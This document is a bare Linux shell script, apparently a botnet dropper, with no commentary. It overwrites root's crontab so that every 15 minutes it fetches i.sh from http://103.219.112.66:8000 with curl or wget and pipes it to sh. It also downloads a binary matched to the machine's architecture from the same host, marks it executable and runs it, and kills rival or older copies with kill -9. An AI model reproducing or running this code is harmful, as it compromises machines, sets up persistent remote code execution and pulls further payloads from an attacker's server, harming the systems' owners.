export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin

mkdir -p /var/spool/cron/crontabs
echo "" > /var/spool/cron/root
echo "*/15 * * * * (/usr/bin/vkpbfa4||/usr/libexec/vkpbfa4||/usr/local/bin/vkpbfa4||/tmp/vkpbfa4||curl -fsSL -m180 http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh" >> /var/spool/cron/root
cp -f /var/spool/cron/root /var/spool/cron/crontabs/root

cd /tmp
touch /usr/local/bin/writeable && cd /usr/local/bin/
touch /usr/libexec/writeable && cd /usr/libexec/
touch /usr/bin/writeable && cd /usr/bin/
rm -rf /usr/local/bin/writeable /usr/libexec/writeable /usr/bin/writeable

export PATH=$PATH:$(pwd)
ps auxf | grep -v grep | grep vkpbfa4 || rm -rf vkpbfa4
if [ ! -f "vkpbfa4" ]; then
    curl -fsSL -m1800 http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -o vkpbfa4||wget -q -T1800 http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -O vkpbfa4
fi
chmod +x vkpbfa4
/usr/bin/vkpbfa4||/usr/libexec/vkpbfa4||/usr/local/bin/vkpbfa4||/tmp/vkpbfa4

ps auxf | grep -v grep | grep vkpbbcb | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep vkpbbcc | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep vkpbbcd | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep vkpbbce | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep vkpbfa0 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep vkpbfa1 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep vkpbfa2 | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep vkpbfa3 | awk '{print $2}' | xargs kill -9

echo "*/15 * * * * (/usr/bin/vkpbfa4||/usr/libexec/vkpbfa4||/usr/local/bin/vkpbfa4||/tmp/vkpbfa4||curl -m180 -fsSL http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh" | crontab -
